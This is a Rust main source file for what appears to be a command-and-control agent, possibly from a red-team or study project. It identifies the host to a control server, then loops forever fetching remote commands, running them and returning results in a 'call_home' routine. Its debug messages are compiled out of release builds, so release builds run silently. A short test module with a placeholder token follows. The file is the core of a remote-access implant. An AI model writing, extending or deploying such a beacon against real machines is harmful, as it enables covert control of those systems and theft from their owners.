extern crate core;

use std::{
    thread,
    time,
};
use std::time::Duration;

mod communication;
mod utils;

use crate::models::{
    Task
};



mod tasks;
mod models;

//const POLL_SLEEP: time::Duration = time::Duration::from_secs(10);
const POLLING_TIME: &'static str = env!("POLLING_TIME");
const DEFAULT_POLLING_TIME: u64 = 10;

/// Fetches commands from the control server and runs them, then returns task results to control
/// server
async fn call_home(token: &String) {
    #[cfg(debug_assertions)]
    println!("Asking server for tasks");

    let tasks: Vec<Task> = match communication::get_commands(token).await {
        Ok(val) => val,
        Err(_) => {
            #[cfg(debug_assertions)]
            println!("Error when asking server for tasks.");
            Vec::new()
        },
    };

    if tasks.is_empty() {
        #[cfg(debug_assertions)]
        println!("No task received");
    }

    for t in tasks {
        #[cfg(debug_assertions)]
        println!("\nReceived task #{}: {}", t.id, t.name);
        tasks::run_task(t);
    }
    // Short sleep to ensure short running tasks are completed before checking, quick and dirty
    // solution
    thread::sleep(time::Duration::from_millis(200));

    let complete_tasks = tasks::check_completed();
    for tr in complete_tasks {
        match communication::send_task_result(&tr, token).await {
            Ok(_) => {
                #[cfg(debug_assertions)]
                println!("Successfully sent task #{} result to server", tr.id);
            }
            Err(_) => {
                #[cfg(debug_assertions)]
                println!("Failed send task #{} result to server!", tr.id);
            }
        };
    }
}

/// Initializes the client by sending ID characteristics to the control server.
/// Will poll the server until a authorization token is received
///
/// # Returns
/// The clients authorization token to be used on further requests to the control server.
async fn initialise_client(polling_time: u64) -> String {
    let mut token: String;
    loop {
        let id = utils::get_host_identify(polling_time);
        token = match communication::send_identity(id).await {
            Ok(val) => val,
            Err(e) => {
                #[cfg(debug_assertions)]
                println!("Failed to get authorization token from server: {}", e);
                String::from("")
            }
        };

        if token != String::from("") {
            break;
        }
        thread::sleep(Duration::from_secs(polling_time));
    }
    #[cfg(debug_assertions)]
    println!("Client initialised");
    return token;
}

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    let polling_time = POLLING_TIME.parse().unwrap_or(DEFAULT_POLLING_TIME);
    let token: String = initialise_client(polling_time).await;

    loop {
        call_home(&token).await;
        thread::sleep(Duration::from_secs(polling_time));
    }
    // Never reached
    // Ok(())
}

/// Tests the main functions
#[cfg(test)]
mod tests {
    use super::*;

    #[actix_rt::test]
    async fn test_initialise_client() {
        let token = initialise_client(0).await;
        let expected_token = "12345".to_string();
        assert_eq!(token, expected_token);
    }

    /// Sanity check
    #[actix_rt::test]
    async fn test_call_home() {
        let token = "12345".to_string();
        call_home(&token).await;
    }
}
